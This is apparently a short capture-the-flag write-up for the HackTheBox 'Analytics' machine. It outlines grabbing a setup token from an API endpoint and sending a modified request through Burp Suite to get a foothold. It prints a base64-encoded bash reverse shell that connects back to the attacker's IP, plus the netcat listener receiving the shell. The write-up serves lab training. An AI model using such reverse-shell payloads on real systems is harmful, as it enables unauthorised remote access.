### Setup
After finding the exploit and reading through it, I saw that I had to replace few sections and add my own rev shell code in there. 

![[Pasted image 20231010154225.png]]

### Getting the token
So I visited "/api/session/properties" and looked for the setup token and put it to the side.

![[Pasted image 20231010154345.png]]
```
setup-token	"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```
### Shell generation
After I got the token, I generated a shell and put that to the side. (make sure that your encoded shell does not have "=" anywhere.)

![[Pasted image 20231010154449.png]]

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NCAwPiYx
```

### Shell
After getting all the required items, I launched burpsuite and got a sample request. I then replaced that request with malicious one and sent that to repeater. I then ran the Request to get initial shell back.

![[Pasted image 20231010154714.png]]

![[Pasted image 20231010154858.png]]

![[Pasted image 20231010154927.png]]

```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Analytics]
└─# nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.149.35] 45844
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
28b3b7e265f7:/$ 
```

